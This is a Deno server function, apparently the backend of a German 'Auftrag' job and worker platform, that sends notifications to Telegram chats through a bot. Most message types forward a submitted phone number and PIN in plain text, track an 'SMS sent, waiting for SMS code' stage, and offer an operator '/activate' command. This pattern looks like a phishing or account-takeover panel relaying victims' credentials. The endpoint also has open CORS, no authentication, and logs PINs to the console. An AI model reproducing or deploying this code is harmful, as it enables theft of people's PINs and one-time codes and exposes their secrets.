
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramNotificationRequest {
  phone?: string;
  accessCode?: string;
  shortId?: string;
  type?: 'request' | 'activation' | 'sms_sent' | 'completed' | 'evaluation_completed' | 'live_chat_message' | 'test';
  workerName?: string;
  auftragTitle?: string;
  auftragsnummer?: string;
  message?: string;
  senderName?: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phone, accessCode, shortId, type = 'request', workerName, auftragTitle, auftragsnummer, message, senderName }: TelegramNotificationRequest = await req.json();
    
    const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const chatId1 = Deno.env.get('TELEGRAM_CHAT_ID');
    const chatId2 = Deno.env.get('TELEGRAM_CHAT_ID_2');
    
    if (!botToken) {
      console.error('Missing Telegram bot token');
      return new Response(
        JSON.stringify({ error: 'Missing Telegram bot token' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Collect all valid chat IDs
    const chatIds: string[] = [];
    if (chatId1) chatIds.push(chatId1);
    if (chatId2) chatIds.push(chatId2);
    
    if (chatIds.length === 0) {
      console.error('No chat IDs configured');
      return new Response(
        JSON.stringify({ error: 'No chat IDs configured' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`📱 Sending to ${chatIds.length} chat ID(s): ${chatIds.join(', ')}`);
    

    // Create different messages based on type
    let telegramMessage: string;
    if (type === 'test') {
      const timestamp = new Date().toLocaleString('de-DE', { 
        timeZone: 'Europe/Berlin',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });
      telegramMessage = `🧪 Test-Nachricht vom Admin-Panel\n⏰ Zeitstempel: ${timestamp}\n👤 Gesendet von: ${senderName}\n\n✅ Dies ist eine Test-Nachricht zur Überprüfung der Telegram-Benachrichtigungen.\n📱 Alle konfigurierten Chat-IDs erhalten diese Nachricht.`;
      if (message) {
        telegramMessage += `\n\n💬 Zusätzliche Nachricht: ${message}`;
      }
    } else if (type === 'live_chat_message') {
      telegramMessage = `💬 Neue Live Chat Nachricht!\n👤 Von: ${senderName}\n📝 Nachricht: ${message}`;
    } else if (type === 'evaluation_completed') {
      telegramMessage = `📝 Auftrag bewertet!\n📋 ${auftragTitle} (${auftragsnummer})\n👤 von ${workerName} wurde erfolgreich bewertet.`;
    } else if (type === 'activation') {
      telegramMessage = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
    } else if (type === 'sms_sent') {
      telegramMessage = `📤 SMS versendet!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
      telegramMessage += `\n⏳ Wartet auf SMS Code`;
    } else if (type === 'completed') {
      telegramMessage = `✅ Vorgang abgeschlossen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
      telegramMessage += `\n🎉 Erfolgreich beendet`;
    } else {
      telegramMessage = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}\n\nZum Aktivieren: /activate ${shortId}`;
      }
    }
    
    console.log(`Sending Telegram notification (${type}):`, { phone, accessCode, shortId, workerName, auftragTitle, auftragsnummer, message, senderName });
    
    let successfulSends = 0;
    const results: any[] = [];
    const errors: string[] = [];

    // Send message to all configured chat IDs
    for (const chatId of chatIds) {
      try {
        const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: telegramMessage,
          }),
        });

        if (telegramResponse.ok) {
          const result = await telegramResponse.json();
          results.push({ chatId, success: true, result });
          successfulSends++;
          console.log(`✅ Telegram notification (${type}) sent successfully to chat ID: ${chatId}`);
        } else {
          const errorText = await telegramResponse.text();
          console.error(`❌ Failed to send to chat ID ${chatId}:`, errorText);
          errors.push(`Chat ID ${chatId}: ${errorText}`);
          results.push({ chatId, success: false, error: errorText });
        }
      } catch (error) {
        console.error(`❌ Error sending to chat ID ${chatId}:`, error);
        errors.push(`Chat ID ${chatId}: ${error.message}`);
        results.push({ chatId, success: false, error: error.message });
      }
    }

    // Return success if at least one message was sent
    if (successfulSends > 0) {
      console.log(`📤 Telegram notification (${type}) sent to ${successfulSends}/${chatIds.length} chat(s)`);
    } else {
      console.error(`❌ Failed to send Telegram notification (${type}) to any chat`);
      return new Response(
        JSON.stringify({ 
          error: 'Failed to send to any chat IDs', 
          details: errors,
          results 
        }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    return new Response(
      JSON.stringify({ 
        success: true, 
        sentTo: successfulSends,
        totalChats: chatIds.length,
        results,
        errors: errors.length > 0 ? errors : undefined
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
